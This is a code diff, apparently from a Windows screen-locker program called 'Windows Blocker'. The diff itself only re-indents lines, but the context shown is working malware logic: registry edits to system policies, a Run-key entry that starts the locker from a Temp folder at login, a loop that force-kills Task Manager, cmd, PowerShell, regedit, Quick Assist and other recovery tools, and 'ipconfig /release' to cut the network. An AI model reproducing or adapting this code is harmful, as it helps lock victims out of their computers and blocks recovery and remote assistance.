@@ -112,11 +112,10 @@ def regedit_change():
         (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', None, None, None, 0)
     ]:                   
         try: 
-            if (
-            reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
-            ) or (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
-            ) or (reg_directory[0] == r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
-            ) or (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications'
+            if (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
+                ) or (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
+                ) or (reg_directory[0] == r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
+                ) or (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications'
             ) or reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run':
                 regedit(*reg_directory, current_user=True) 
             else:
@@ -174,11 +173,10 @@ def regedit_change():
         (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Windows Blocker', r'C:\Windows\Temp\Windows.system.blocker\Windows Blocker.exe', 1, 1)
     ]:
         try: 
-            if (
-            reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
-            ) or (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
-            ) or (reg_value[0] == r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
-            ) or (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications'
+            if (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
+                ) or (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
+                ) or (reg_value[0] == r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
+                ) or (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications'
             ) or reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run':
                 regedit(*reg_value, current_user=True) 
             else: 
@@ -510,9 +508,9 @@ def agent():
             try:
                 try:
                     for bad_process in findall(
-                            r'(explorer.exe|osk.exe|mmc.exe|cmd.exe|mstsc.exe|frgui.exe|iscsicpl.exe|regedit.exe|perfmon.exe|odbcad32.exe|msconfig.exe|Taskmgr.exe|powershell.exe|CCleaner32.exe|CCleaner64.exe|quickassist.exe|powershell_ise.exe|SystemSettings.exe|ProcessHacker.exe|OldNewExplorerCfg.exe)',
-                            run('tasklist', stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').lower()
-                        ): 
+                        r'(explorer.exe|osk.exe|mmc.exe|cmd.exe|mstsc.exe|frgui.exe|iscsicpl.exe|regedit.exe|perfmon.exe|odbcad32.exe|msconfig.exe|Taskmgr.exe|powershell.exe|CCleaner32.exe|CCleaner64.exe|quickassist.exe|powershell_ise.exe|SystemSettings.exe|ProcessHacker.exe|OldNewExplorerCfg.exe)',
+                        run('tasklist', stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').lower()
+                    ): 
                         Popen(['taskkill', '/f', '/IM', bad_process], stdout=DEVNULL, stderr=DEVNULL, shell=True)
 
                     run('ipconfig /release'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
